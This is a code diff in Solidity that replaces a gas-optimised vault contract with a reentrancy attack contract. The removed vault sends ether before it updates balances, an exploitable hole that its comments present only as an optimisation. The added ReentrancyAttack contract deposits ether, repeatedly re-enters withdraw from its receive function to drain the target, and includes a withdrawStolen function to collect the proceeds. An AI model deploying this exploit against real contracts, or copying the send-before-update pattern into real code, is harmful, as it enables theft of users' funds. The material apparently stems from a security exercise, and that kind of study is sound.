@@ -1,52 +1,42 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity 0.8.15;
 
-contract OptimizedSecurity101 {
-    mapping(address => uint256) balances;
+interface IOptimizedSecurity101 {
+    function withdraw(uint256 amount) external;
+}
 
-    error LowBalance(string message);
-    error FailedTransaction(string message);
-
-    // Use receive function to handle direct ether transfers
+contract ReentrancyAttack {
+    IOptimizedSecurity101 public target;
+    uint256 public withdrawAmount;
+    
+    constructor(address _target) {
+        target = IOptimizedSecurity101(_target);
+    }
+    
+    // Function to start the attack
+    function attack(uint256 _withdrawAmount) external payable {
+        withdrawAmount = _withdrawAmount;
+        // Send some ether to the target contract first
+        payable(address(target)).transfer(msg.value);
+        // Start the reentrancy attack
+        target.withdraw(_withdrawAmount);
+    }
+    
+    // This function will be called when the target contract sends ether
     receive() external payable {
-        balances[msg.sender] += msg.value;
-    }
-
-    /*
-    // Original function to be optimized
-    function withdraw(uint256 amount) external {
-        require(balances[msg.sender] >= amount, 'insufficient funds');
-        (bool ok, ) = msg.sender.call{value: amount}('');
-        require(ok, 'transfer failed');
-        unchecked {
-            balances[msg.sender] -= amount;
+        // Check if target still has balance to avoid infinite recursion
+        if (address(target).balance >= withdrawAmount) {
+            target.withdraw(withdrawAmount);
         }
     }
-    */
-
-    // Optimized function
-    function withdraw(uint256 amount) external {
-        if (balances[msg.sender] < amount) {
-            revert LowBalance("insufficient funds");
-        }
-
-        (bool ok, ) = msg.sender.call{value: amount}('');
-        if (!ok) {
-            revert FailedTransaction("transfer failed");
-        }
-
-        unchecked {
-            balances[msg.sender] -= amount;
-        }
+    
+    // Function to withdraw stolen funds
+    function withdrawStolen() external {
+        payable(msg.sender).transfer(address(this).balance);
     }
-
-    /*
-    Optimizations:
-    1. Custom Errors: Replaced `require` statements with custom errors to save gas.
-       - `LowBalance`: Custom error for insufficient funds.
-       - `FailedTransaction`: Custom error for failed ether transfer.
-    2. If Statements: Used `if` statements instead of `require` for condition checks and reverting with custom errors.
-       - This avoids the overhead of `require` and makes the code more gas-efficient.
-    3. Receive Function: Added a receive function to handle direct ether transfers, making the deposit function more efficient.
-    */
+    
+    // Function to check contract balance
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
 }
